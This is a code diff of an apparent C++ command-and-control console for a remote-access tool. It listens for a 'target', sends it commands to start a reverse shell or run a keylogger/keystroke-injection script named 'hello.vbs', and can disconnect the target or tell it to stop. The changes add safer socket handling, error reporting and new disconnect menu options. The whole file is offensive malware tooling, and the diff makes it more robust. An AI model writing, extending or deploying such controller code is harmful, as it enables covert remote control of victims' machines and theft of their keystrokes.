@@ -37,31 +37,40 @@ int Get_menu_option();
 int Rev_Shell();
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
+void safe_closesocket(SOCKET& s) 
+{
+    if (s != INVALID_SOCKET) {
+        shutdown(s, SD_BOTH); // Prevent further sends/receives
+        closesocket(s);
+        s = INVALID_SOCKET; // Set to INVALID_SOCKET to prevent double closing
+    }
+}
+
 int main(int argc, char *argv[]) 
 {
     argc_global = argc;
     argv_global = argv;
     
-    socket_setup();
+    if (socket_setup() != 0) return 1;
     
     bool loop = true;
     while(loop)
     {
         switch (Get_menu_option())
         {
-            case 1:
+            case 1:                                                                         //connect
             {   
                 if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR)
                 {
-                    std::cerr << "listen failed.\n";
-                    closesocket(listenSocket);
+                    std::cerr << "listen failed with error: " << WSAGetLastError() << std::endl;
+                    safe_closesocket(listenSocket); // Use safe_closesocket here
                     WSACleanup();
                     return 1;
-                }
-                
+                }               
+
                 cout << "\n>> Waiting for incoming connections..." << endl;
                 clientSocket = accept(listenSocket, nullptr, nullptr);
-
+                
                 if(get_client_ip(clientSocket) == "127.0.0.1")
                 {   
                     cout << ">> " << get_client_ip(clientSocket) << " connected." << endl;
@@ -76,31 +85,69 @@ int main(int argc, char *argv[])
                 break;
             }
             
-            case 2:
+            case 2:                                                                     //Rev shell
             {
-                
-                send_data(clientSocket,2);
-                if(!Rev_Shell())
-                {
-                    cout << endl << ">> Closing Rev Shell..\n";
-                    system("pause");
+                if (targetconnected && clientSocket != INVALID_SOCKET) { // VERY IMPORTANT CHECK
+                    send_data(clientSocket, 2);
+                    if (!Rev_Shell()) {
+                        cout << endl << ">> Closing Rev Shell..\n";
+                    }
+                } else {
+                    cout << ">> Target not connected or socket invalid!!" << endl;
                 }
-                break;
             }
             
-            case 3:
+            case 3:                                                                     //Execute keylogger
             {
-                send_data(clientSocket,3);
-                send_data(clientSocket,"hello.vbs");
-                cout << ">> Sent " << endl;
+                if (targetconnected && clientSocket != INVALID_SOCKET) { // VERY IMPORTANT CHECK
+                    send_data(clientSocket, 3);
+                    send_data(clientSocket, "hello.vbs");
+                    cout << ">> Sent " << endl;
+                } else {
+                    cout << ">> Target not connected or socket invalid!!" << endl;
+                }
                 system("pause");
                 break;
             }
-            case 0:
+            case 99:                                                                    //DC Current target
             {
-                send_data(clientSocket,0);
-                closesocket(clientSocket);
-                closesocket(listenSocket);
+                if (targetconnected) {
+                    send_data(clientSocket, 99); // Inform the client (important!)
+                    safe_closesocket(clientSocket);
+                    safe_closesocket(listenSocket);
+                    targetconnected = false;
+
+                    if (socket_setup() != 0) {
+                    return 1; // Handle socket setup error
+                    }
+
+                    cout << ">> Disconnecting client..." << endl << endl;
+                } 
+                else 
+                {
+                    cout << ">> No client connected to disconnect." << endl;
+                }
+                system("pause");
+                break;
+            }
+            case 11:                                                                    //DC Current target and stop its code execution
+            {
+                if (targetconnected) {
+                    send_data(clientSocket, 11); // Inform the client (important!)
+                    safe_closesocket(clientSocket);
+                    targetconnected = false;
+                    cout << ">> Disconnecting client and requesting stop..." << endl << endl;
+                } else {
+                    cout << ">> No client connected to disconnect." << endl;
+                }
+                system("pause");
+                break;
+            }
+            case 0:                                                                     //Exit console
+            {
+                //send_data(clientSocket,99);
+                safe_closesocket(clientSocket);
+                safe_closesocket(listenSocket);
 
                 WSACleanup();
                 cout << ">> Exiting..." << endl << endl;
@@ -122,31 +169,35 @@ int main(int argc, char *argv[])
 
 int socket_setup()
 {
-    // Initialize Winsock
     WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) 
-    {
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         std::cerr << "WSAStartup failed.\n";
         return 1;
     }
 
     listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (listenSocket == INVALID_SOCKET) 
-    {
-        std::cerr << "socket failed.\n";
+    if (listenSocket == INVALID_SOCKET) {
+        std::cerr << "socket failed with error: " << WSAGetLastError() << std::endl;
         WSACleanup();
         return 1;
     }
 
     sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(8081);                                                                      
-    serverAddr.sin_addr.s_addr = INADDR_ANY;                                                    // Any available network interface
-    
-    if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
-    {
-        std::cerr << "bind failed.\n";
-        closesocket(listenSocket);
+    serverAddr.sin_port = htons(8081);
+    serverAddr.sin_addr.s_addr = INADDR_ANY;
+
+    int reuse = 1;
+    if (setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse)) == SOCKET_ERROR) {
+        std::cerr << "setsockopt failed with error: " << WSAGetLastError() << std::endl;
+        safe_closesocket(listenSocket); // Use safe_closesocket here
+        WSACleanup();
+        return 1;
+    }
+
+    if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+        std::cerr << "bind failed with error: " << WSAGetLastError() << std::endl;
+        safe_closesocket(listenSocket); // Use safe_closesocket here
         WSACleanup();
         return 1;
     }
@@ -310,13 +361,20 @@ int Get_menu_option()
 
                                     Connect a target                        1)";
     
-    if(!targetconnected) cout << "  [-]";
-    else cout << "  [o]";
+    if(!targetconnected) cout << "  [-]\n";
+    else cout << "  [o]\n";
 
     cout << R"(
                                     Rev Shell                               2
                                     KeyStroke Injection                     3
-            
+                                                                            )";            
+                                    
+    if(targetconnected)cout << R"(
+                                    Disconnect Current Target              [99]
+                                    DC target & stop its code              {11}
+                                                                            )";
+
+    cout << R"(
                                     Exit                                    0)";
 
     cout << "\n\n>> ";
